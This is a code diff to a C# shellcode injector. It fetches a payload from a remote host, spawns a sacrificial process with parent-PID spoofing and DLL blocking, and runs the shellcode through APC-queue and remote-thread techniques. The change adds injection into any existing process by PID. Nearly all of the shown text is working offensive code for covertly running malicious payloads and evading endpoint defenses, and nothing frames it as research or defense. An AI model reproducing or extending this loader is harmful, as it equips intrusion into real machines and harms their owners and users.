@@ -1,5 +1,6 @@
 ﻿using System;
 using static Shellcode_Injector.WinApi;
+using System.ComponentModel;
 
 namespace Shellcode_Injector
 {
@@ -15,19 +16,29 @@ namespace Shellcode_Injector
             //Fetch shellcode
             byte[] shellcode = Helpers.Fetch(arguments.shellcode["host"], arguments.shellcode["file"]);
 
-            //Prepare process attributes
-            WinApi.SINEX sin = Helpers.SetAtt(
-                (bool)arguments.process["spoof_ppid"],
-                (bool)arguments.process["block_dlls"],
-                arguments.ppid
-                );
+            //Define Process info
+            WinApi.PIN pinfo = new WinApi.PIN();
 
-            //Create the process that will be injected
-            WinApi.PIN pinfo = Helpers.StartS(
-                sin,
-                (string)arguments.process["cmd"],
-                (string)arguments.process["cwd"]
-                );
+            if (arguments.pid == 0)  //Create sacrifical process
+            {
+                //Prepare process attributes
+                WinApi.SINEX sin = Helpers.SetAtt(
+                    (bool)arguments.process["spoof_ppid"],
+                    (bool)arguments.process["block_dlls"],
+                    arguments.ppid
+                    );
+
+                //Create the process that will be injected
+                pinfo = Helpers.StartS(
+                    sin,
+                    (string)arguments.process["cmd"],
+                    (string)arguments.process["cwd"]
+                    );
+            }
+            else //Assume remote injection 
+            {
+                (pinfo.hProcess, pinfo.hThread) = Helpers.GetHand(arguments.pid);
+            }
 
             //Memory allocation
             IntPtr mmr = IntPtr.Zero;
@@ -54,7 +65,7 @@ namespace Shellcode_Injector
                     Helpers.SCRun("crt", pinfo, mmr);
                     break;
 
-                case "quapc":
+                case "quapc" when arguments.pid ==0:
                     Helpers.SCRun("qua", pinfo, mmr);
                     break;
 
@@ -62,7 +73,7 @@ namespace Shellcode_Injector
                     Helpers.NTSCRun("ncte", pinfo, mmr);
                     break;
 
-                case "ntqathread":
+                case "ntqathread" when arguments.pid == 0:
                     Helpers.NTSCRun("nqat", pinfo, mmr);
                     break;
 
@@ -72,6 +83,9 @@ namespace Shellcode_Injector
                     break;
 
             }
+            //Close handles
+            WinApi.CloseH(pinfo.hThread);
+            WinApi.CloseH(pinfo.hProcess);
         }
     }
 }
